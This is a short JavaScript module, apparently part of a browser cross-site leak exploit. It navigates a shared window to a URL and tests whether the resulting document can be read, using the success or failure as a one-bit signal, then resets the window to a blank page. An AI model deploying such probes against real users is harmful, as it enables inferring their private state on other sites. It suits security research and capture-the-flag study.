const leak = async (url) => {
    return new Promise(async(r) => {
        window.WW.location = url
        // could be done differently
        await sleep(1000)
        try {
            
            console.debug(window.WW.document)
            await sleep(1000)
            return r(1)


        }
        catch(e){
            console.debug(e)
            await switchToBlank(window.WW)
            return r(0)
        }
    })
}


const switchToBlank = async (w) => {
    w.location = 'blank.html'
    while(1){
        try{
            if(w.location.pathname.includes('blank.html')){
                // we need to wait just a bit more here
                await sleep(100)
                return 1
            }
        }
        catch(e){}
        await sleep(10)
    }
}

const sleep = (ms) => {
    return new Promise(r => setTimeout(r, ms));
}


export { leak }